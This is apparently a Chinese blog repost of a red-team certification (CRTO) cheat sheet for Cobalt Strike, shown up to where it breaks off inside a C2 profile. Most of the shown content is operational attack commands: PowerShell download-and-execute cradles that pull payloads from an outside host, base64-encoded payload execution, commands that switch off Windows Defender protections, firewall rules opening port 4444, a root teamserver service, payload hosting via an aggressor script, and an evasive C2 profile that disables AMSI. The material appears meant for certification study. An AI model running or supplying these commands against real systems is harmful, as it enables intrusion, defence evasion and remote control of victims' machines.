

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="shiyan">
  <meta name="keywords" content="">
  
    <meta name="description" content="名称：CRTO - 红队指挥备忘单 (Cobalt Strike) 课程链接：https:&#x2F;&#x2F;training.zeropointsecurity.co.uk&#x2F;courses&#x2F;red-team-ops 原始备忘单链接：https:&#x2F;&#x2F;github.com&#x2F;0xn1k5&#x2F;Red-Teaming&#x2F;blob&#x2F;main&#x2F;Red Team Certifications - Notes %26 Cheat S">
<meta property="og:type" content="article">
<meta property="og:title" content="CRTO - 红队指挥备忘单 (Cobalt Strike) - 2024">
<meta property="og:url" content="https://sh1yan.top/2025/04/01/Certified-Red-Team-Operator-(CRTO)-Notes/index.html">
<meta property="og:site_name" content="sh1yan&#39;blog">
<meta property="og:description" content="名称：CRTO - 红队指挥备忘单 (Cobalt Strike) 课程链接：https:&#x2F;&#x2F;training.zeropointsecurity.co.uk&#x2F;courses&#x2F;red-team-ops 原始备忘单链接：https:&#x2F;&#x2F;github.com&#x2F;0xn1k5&#x2F;Red-Teaming&#x2F;blob&#x2F;main&#x2F;Red Team Certifications - Notes %26 Cheat S">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2025-04-01T15:50:55.000Z">
<meta property="article:modified_time" content="2025-04-01T12:30:47.600Z">
<meta property="article:author" content="shiyan">
<meta property="article:tag" content="Cobalt Strike">
<meta property="article:tag" content="CRTO">
<meta name="twitter:card" content="summary_large_image">
  
  
  
  <title>CRTO - 红队指挥备忘单 (Cobalt Strike) - 2024 - sh1yan&#39;blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>sh1yan&#39;blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/yqlj/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item dropdown">
              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                <i class="iconfont icon-th-large"></i>
                <span>其他</span>
              </a>
              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
                
                  
                  
                  
                  <a class="dropdown-item" href="/open-source/" target="_self">
                    
                    <span>我开源的安全项目</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
                    
                    <span>反弹shell命令集合</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/reverse-shell/" target="_self">
                    
                    <span>简易反弹shell集合</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
                    
                    <span>网站开发者工具箱</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/linux-command/" target="_self">
                    
                    <span>Linux命令工具箱</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/CyberChef/" target="_self">
                    
                    <span>CyberChef工具箱</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
                    
                    <span>开发者速查备忘录</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/SQLMapCG-CN/" target="_self">
                    
                    <span>SQLMap命令生成器</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/cvssjs/" target="_self">
                    
                    <span>CVSSv3.1 漏洞评分</span>
                  </a>
                
              </div>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="CRTO - 红队指挥备忘单 (Cobalt Strike) - 2024"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-04-01 23:50" pubdate>
          2025年4月1日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          150k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          1251 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">CRTO - 红队指挥备忘单 (Cobalt Strike) - 2024</h1>
            
            
              <div class="markdown-body">
                
                <p><strong>名称</strong>：<strong>CRTO - 红队指挥备忘单 (Cobalt Strike)</strong></p>
<p>课程链接：<a target="_blank" rel="noopener" href="https://training.zeropointsecurity.co.uk/courses/red-team-ops">https://training.zeropointsecurity.co.uk/courses/red-team-ops</a></p>
<p>原始备忘单链接：<a target="_blank" rel="noopener" href="https://github.com/0xn1k5/Red-Teaming/blob/main/Red">https://github.com/0xn1k5/Red-Teaming/blob/main/Red</a> Team Certifications - Notes %26 Cheat Sheets&#x2F;CRTO - Notes %26 Cheat Sheet.md</p>
<p>编译者：Nikhil Raj（Twitter：<a target="_blank" rel="noopener" href="https://twitter.com/0xn1k5">https://twitter.com/0xn1k5</a> | 博客：<a target="_blank" rel="noopener" href="https://organicsecurity.in/">https</a> :&#x2F;&#x2F;organicsecurity.in ）</p>
<p>修改者：An0nud4y（Twitter：<a target="_blank" rel="noopener" href="https://twitter.com/an0nud4y">https://twitter.com/an0nud4y</a> | 博客：<a target="_blank" rel="noopener" href="https://an0nud4y.com/">https://an0nud4y.com</a>）</p>
<blockquote>
<p><strong>免责声明</strong>：本备忘单是从多个来源汇编而来，目的是帮助渗透测试人员和红队成员学习。所有工具和技术的功劳均归原作者所有。我在本文档底部添加了对原始来源的引用。</p>
</blockquote>
<span id="more"></span> 
<blockquote>
<p>这些注释&#x2F;备忘单也可以在 Github 上找到 - <a target="_blank" rel="noopener" href="https://github.com/An0nUD4Y/CRTO-Notes">https://github.com/An0nUD4Y/CRTO-Notes</a></p>
</blockquote>
<blockquote>
<p>红队笔记概念：<a target="_blank" rel="noopener" href="https://an0nud4y.notion.site/CRTO-Notes-a2a6242a4c4b4506b31f46db20155608?pvs=4">https://an0nud4y.notion.site/CRTO-Notes-a2a6242a4c4b4506b31f46db20155608? pvs=4</a></p>
</blockquote>
<blockquote>
<p><strong>由于政策原因，对我的CRTO</strong>笔记的访问受到限制。如果您已注册 CRTO，请在 discord (an0nud4y) 或<a target="_blank" rel="noopener" href="https://an0nud4y.com/">https://an0nud4y.com</a>上联系我，以获取我的 CRTO 笔记访问权限。</p>
</blockquote>
<hr>
<h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><ul>
<li><a target="_blank" rel="noopener" href="https://m4lici0u5.com/notes/crto-notes/?s=09#misc">杂项</a></li>
<li><a target="_blank" rel="noopener" href="https://m4lici0u5.com/notes/crto-notes/?s=09#command--control">指挥与控制</a></li>
<li><a target="_blank" rel="noopener" href="https://m4lici0u5.com/notes/crto-notes/?s=09#setup-cs-listeners">设置 CS 监听器</a></li>
<li><a target="_blank" rel="noopener" href="https://m4lici0u5.com/notes/crto-notes/?s=09#defender-antivirus--amsi">Defender 防病毒软件&#x2F;AMSI</a></li>
<li><a target="_blank" rel="noopener" href="https://m4lici0u5.com/notes/crto-notes/?s=09#initial-compromise">最初的妥协</a></li>
<li><a target="_blank" rel="noopener" href="https://m4lici0u5.com/notes/crto-notes/?s=09#host-reconnaissance">主机侦察</a></li>
<li><a target="_blank" rel="noopener" href="https://m4lici0u5.com/notes/crto-notes/?s=09#host-persistence-normal--privileged">主机持久性</a></li>
<li><a target="_blank" rel="noopener" href="https://m4lici0u5.com/notes/crto-notes/?s=09#host-privilege-escalation">主机权限提升</a></li>
<li><a target="_blank" rel="noopener" href="https://m4lici0u5.com/notes/crto-notes/?s=09#credential-theft">凭证盗窃</a></li>
<li><a target="_blank" rel="noopener" href="https://m4lici0u5.com/notes/crto-notes/?s=09#domain-recon">领域侦察</a></li>
<li><a target="_blank" rel="noopener" href="https://m4lici0u5.com/notes/crto-notes/?s=09#user-impersonation">用户模拟</a></li>
<li><a target="_blank" rel="noopener" href="https://m4lici0u5.com/notes/crto-notes/?s=09#lateral-movement">横向移动</a></li>
<li><a target="_blank" rel="noopener" href="https://m4lici0u5.com/notes/crto-notes/?s=09#session-passing">会话传递</a></li>
<li><a target="_blank" rel="noopener" href="https://m4lici0u5.com/notes/crto-notes/?s=09#pivoting">旋转</a></li>
<li><a target="_blank" rel="noopener" href="https://m4lici0u5.com/notes/crto-notes/?s=09#data-protection-api-dpapi">数据保护 API (DPAPI)</a></li>
<li><a target="_blank" rel="noopener" href="https://m4lici0u5.com/notes/crto-notes/?s=09#kerberos">凯尔伯罗斯</a></li>
<li><a target="_blank" rel="noopener" href="https://m4lici0u5.com/notes/crto-notes/?s=09#active-directory-certificate-services">Active Directory 证书服务</a></li>
<li><a target="_blank" rel="noopener" href="https://m4lici0u5.com/notes/crto-notes/?s=09#group-policy">组策略</a></li>
<li><a target="_blank" rel="noopener" href="https://m4lici0u5.com/notes/crto-notes/?s=09#mssql-servers">MSSQL 服务器</a></li>
<li><a target="_blank" rel="noopener" href="https://m4lici0u5.com/notes/crto-notes/?s=09#domain-dominance">域名控制</a></li>
<li><a target="_blank" rel="noopener" href="https://m4lici0u5.com/notes/crto-notes/?s=09#forest--domain-trusts">森林和域信任</a></li>
<li><a target="_blank" rel="noopener" href="https://m4lici0u5.com/notes/crto-notes/?s=09#laps">洛杉矶郡</a></li>
<li><a target="_blank" rel="noopener" href="https://m4lici0u5.com/notes/crto-notes/?s=09#applocker">应用程序锁</a></li>
<li><a target="_blank" rel="noopener" href="https://m4lici0u5.com/notes/crto-notes/?s=09#data-exfiltration">数据泄露</a></li>
<li><a target="_blank" rel="noopener" href="https://m4lici0u5.com/notes/crto-notes/?s=09#reference">参考</a></li>
</ul>
<hr>
<h3 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># Run a python3 webserver</span><br><span class="hljs-variable">$</span> python3 <span class="hljs-literal">-m</span> http.server<br><br><span class="hljs-comment"># Check outbound access to TeamServer</span><br><span class="hljs-variable">$</span> <span class="hljs-built_in">iwr</span> <span class="hljs-literal">-Uri</span> http://nickelviper.com/a<br><span class="hljs-variable">$</span> <span class="hljs-built_in">iwr</span> <span class="hljs-literal">-Uri</span> http://nickelviper.com/a <span class="hljs-literal">-OutFile</span> beacon.ps1<br><span class="hljs-comment"># Change incoming firewall rules</span><br>beacon&gt; powerpick <span class="hljs-built_in">Get-NetFirewallRule</span><br><span class="hljs-comment"># Enable http inbound and outbound connection</span><br>beacon&gt; powerpick <span class="hljs-built_in">New-NetFirewallRule</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;HTTP-Inbound&quot;</span> <span class="hljs-literal">-DisplayName</span> <span class="hljs-string">&quot;HTTP (TCP-In)&quot;</span> <span class="hljs-literal">-Enabled</span> True <span class="hljs-literal">-Direction</span> Inbound <span class="hljs-literal">-Protocol</span> TCP <span class="hljs-literal">-Action</span> Allow <span class="hljs-literal">-LocalPort</span> <span class="hljs-number">80</span><br>beacon&gt; powerpick <span class="hljs-built_in">New-NetFirewallRule</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;HTTP-Outbound&quot;</span> <span class="hljs-literal">-DisplayName</span> <span class="hljs-string">&quot;HTTP (TCP-Out)&quot;</span> <span class="hljs-literal">-Enabled</span> True <span class="hljs-literal">-Direction</span> Outbound <span class="hljs-literal">-Protocol</span> TCP <span class="hljs-literal">-Action</span> Allow <span class="hljs-literal">-LocalPort</span> <span class="hljs-number">80</span><br><span class="hljs-comment"># Enable Specific port inbound and outbound connection</span><br><span class="hljs-comment"># Inbound Rule</span><br>beacon&gt; powerpick <span class="hljs-built_in">New-NetFirewallRule</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;Allow-Port-Inbound&quot;</span> <span class="hljs-literal">-DisplayName</span> <span class="hljs-string">&quot;Allow Inbound Connections to Port 12345&quot;</span> <span class="hljs-literal">-Enabled</span> True <span class="hljs-literal">-Direction</span> Inbound <span class="hljs-literal">-Protocol</span> TCP <span class="hljs-literal">-Action</span> Allow <span class="hljs-literal">-LocalPort</span> <span class="hljs-number">4444</span><br><span class="hljs-comment"># Outbound Rule</span><br>beacon&gt; powerpick <span class="hljs-built_in">New-NetFirewallRule</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;Allow-Port-Outbound&quot;</span> <span class="hljs-literal">-DisplayName</span> <span class="hljs-string">&quot;Allow Outbound Connections to Port 12345&quot;</span> <span class="hljs-literal">-Enabled</span> True <span class="hljs-literal">-Direction</span> Outbound <span class="hljs-literal">-Protocol</span> TCP <span class="hljs-literal">-Action</span> Allow <span class="hljs-literal">-RemotePort</span> <span class="hljs-number">4444</span><br><span class="hljs-comment"># Removing a firewall rule by its name</span><br>beacon&gt; powerpick <span class="hljs-built_in">Remove-NetFirewallRule</span> <span class="hljs-literal">-DisplayName</span> <span class="hljs-string">&quot;Test Rule&quot;</span><br><br><span class="hljs-comment"># Disabled Real Time Protection / Windows Defender</span><br>beacon&gt; powerpick <span class="hljs-built_in">Set-MPPreference</span> <span class="hljs-literal">-DisableRealTimeMonitoring</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Verbose</span><br>beacon&gt; powerpick <span class="hljs-built_in">Set-MPPreference</span> <span class="hljs-literal">-DisableIOAVProtection</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Verbose</span><br>beacon&gt; powerpick <span class="hljs-built_in">Set-MPPreference</span> <span class="hljs-literal">-DisableIntrusionPreventionSystem</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Verbose</span><br><br><span class="hljs-comment">## Encode the powershell payload to base64 for handling extra quotes </span><br><span class="hljs-comment"># From Powershell </span><br><span class="hljs-built_in">PS</span> C:\&gt; <span class="hljs-variable">$str</span> = <span class="hljs-string">&#x27;IEX ((new-object net.webclient).downloadstring(&quot;http://nickelviper.com/a&quot;))&#x27;</span><br><span class="hljs-built_in">PS</span> C:\&gt; [<span class="hljs-type">System.Convert</span>]::ToBase64String([<span class="hljs-type">System.Text.Encoding</span>]::Unicode.GetBytes(<span class="hljs-variable">$str</span>))<br><span class="hljs-comment">#From Linux </span><br><span class="hljs-variable">$</span> <span class="hljs-built_in">echo</span> <span class="hljs-literal">-n</span> <span class="hljs-string">&quot;IEX(New-Object Net.WebClient).downloadString(&#x27;http://10.10.14.31/shell.ps1&#x27;)&quot;</span> | iconv <span class="hljs-literal">-t</span> UTF<span class="hljs-literal">-16LE</span> | base64 <span class="hljs-literal">-w</span> <span class="hljs-number">0</span><br><br><span class="hljs-comment"># Final Command to execute encoded payload</span><br>powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-enc</span> &lt;BASE64_ENCODED_PAYLOAD&gt;<br><br><span class="hljs-comment"># CobaltStrike AggressorScripts for Persistence</span><br>https://github.com/Peco602/cobaltstrike<span class="hljs-literal">-aggressor-scripts</span>/tree/main/persistence<span class="hljs-literal">-sharpersist</span><br></code></pre></td></tr></table></figure>

<h3 id="指挥与控制"><a href="#指挥与控制" class="headerlink" title="指挥与控制"></a>指挥与控制</h3><ul>
<li>为基于 DNS 的信标有效负载设置 DNS 记录</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># Set below DNS Type A &amp; NS records, where IP points to TeamServer</span><br><br><span class="hljs-selector-tag">@</span>    | A  | <span class="hljs-number">10.10</span>.<span class="hljs-number">5.50</span><br>ns1  | A  | <span class="hljs-number">10.10</span>.<span class="hljs-number">5.50</span><br>pics | NS | ns1.nickelviper.com<br><br><span class="hljs-comment"># Verify the DNS configuration from TeamServer, it should return 0.0.0.0</span><br><span class="hljs-variable">$</span> dig @ns1.nickelviper.com test.pics.nickelviper.com +short<br><br><span class="hljs-comment"># Use pics.nickelviper.com as DNS Host and Stager in Listener Configuration</span><br></code></pre></td></tr></table></figure>

<ul>
<li>启动团队服务器并作为服务运行</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs powershell">&gt; sudo ./teamserver <span class="hljs-number">10.10</span>.<span class="hljs-number">5.50</span> Passw0<span class="hljs-built_in">rd</span>! c2<span class="hljs-literal">-profiles</span>/normal/webbug.profile<br><span class="hljs-variable">$</span> ip a<br><span class="hljs-variable">$</span> sudo nano /etc/systemd/system/teamserver.service<br><br>[<span class="hljs-type">Unit</span>]<br>Description=Cobalt Strike Team Server<br>After=network.target<br>StartLimitIntervalSec=<span class="hljs-number">0</span><br><br>[<span class="hljs-type">Service</span>]<br><span class="hljs-built_in">Type</span>=simple<br>Restart=always<br>RestartSec=<span class="hljs-number">1</span><br>User=root<br>WorkingDirectory=/home/attacker/cobaltstrike<br>ExecStart=/home/attacker/cobaltstrike/teamserver <span class="hljs-number">10.10</span>.<span class="hljs-number">5.50</span> Passw0<span class="hljs-built_in">rd</span>! c2<span class="hljs-literal">-profiles</span>/normal/webbug.profile<br><br>[<span class="hljs-type">Install</span>]<br>WantedBy=multi<span class="hljs-literal">-user</span>.target<br><br><span class="hljs-variable">$</span> sudo systemctl daemon<span class="hljs-literal">-reload</span><br><span class="hljs-variable">$</span> sudo systemctl status teamserver.service<br><span class="hljs-variable">$</span> sudo systemctl <span class="hljs-built_in">start</span> teamserver.service<br><span class="hljs-variable">$</span> sudo systemctl enable teamserver.service<br></code></pre></td></tr></table></figure>

<ul>
<li>在无头模式下通过 agscript 客户端启用 Web 交付有效负载的托管</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> <span class="hljs-built_in">cat</span> host_payloads.cna<br><br><span class="hljs-comment"># Connected and ready</span><br>on ready &#123;<br><br>    <span class="hljs-comment"># Generate payload</span><br>    <span class="hljs-variable">$payload</span> = artifact_payload(<span class="hljs-string">&quot;http&quot;</span>, <span class="hljs-string">&quot;powershell&quot;</span>, <span class="hljs-string">&quot;x64&quot;</span>);<br><br>    <span class="hljs-comment"># Host payload</span><br>    site_host(<span class="hljs-string">&quot;10.10.5.50&quot;</span>, <span class="hljs-number">80</span>, <span class="hljs-string">&quot;/a&quot;</span>, <span class="hljs-variable">$payload</span>, <span class="hljs-string">&quot;text/plain&quot;</span>, <span class="hljs-string">&quot;Auto Web Delivery (PowerShell)&quot;</span>, false);<br>&#125;<br><br><span class="hljs-comment"># Add below command in &quot;/etc/systemd/system/teamserver.service&quot; file</span><br><br>ExecStartPost=/bin/sh <span class="hljs-literal">-c</span> <span class="hljs-string">&#x27;/usr/bin/sleep 30; /home/attacker/cobaltstrike/agscript 127.0.0.1 50050 headless Passw0rd! host_payloads.cna &amp;&#x27;</span><br></code></pre></td></tr></table></figure>

<ul>
<li>适用于 CRTO 的定制可锻造 C2 型材</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># Custom C2 Profile for CRTO (Modified by an0nud4y)</span><br><span class="hljs-built_in">set</span> sample_name <span class="hljs-string">&quot;Dumbledore&quot;</span>;<br><span class="hljs-built_in">set</span> sleeptime <span class="hljs-string">&quot;2000&quot;</span>;<br><span class="hljs-built_in">set</span> jitter    <span class="hljs-string">&quot;20&quot;</span>;<br><span class="hljs-built_in">set</span> useragent <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36&quot;</span>;<br><span class="hljs-built_in">set</span> host_stage <span class="hljs-string">&quot;true&quot;</span>;<br><br>stage &#123;<br>        <span class="hljs-built_in">set</span> userwx <span class="hljs-string">&quot;false&quot;</span>; <span class="hljs-comment">#Allocate Beacon DLL as RW/RX rather than RWX.</span><br>        <span class="hljs-built_in">set</span> cleanup <span class="hljs-string">&quot;true&quot;</span>; <span class="hljs-comment">#Free memory associated with reflective loader after it has been loaded</span><br>        <span class="hljs-built_in">set</span> obfuscate <span class="hljs-string">&quot;true&quot;</span>; <span class="hljs-comment"># Load Beacon into memory without its DLL headers</span><br>        <span class="hljs-built_in">set</span> module_x64 <span class="hljs-string">&quot;xpsservices.dll&quot;</span>; <span class="hljs-comment">#Load DLL from disk, then replace its memory with Beacon.</span><br>&#125;<br><br>post<span class="hljs-literal">-ex</span> &#123;<br>        <span class="hljs-built_in">set</span> amsi_disable <span class="hljs-string">&quot;true&quot;</span>;<br>        <span class="hljs-comment"># Malleable C2 amsi_disable does not applies to Cobalt Strike Jump Command (psexec_psh , winrm and winrm64).</span><br>				<span 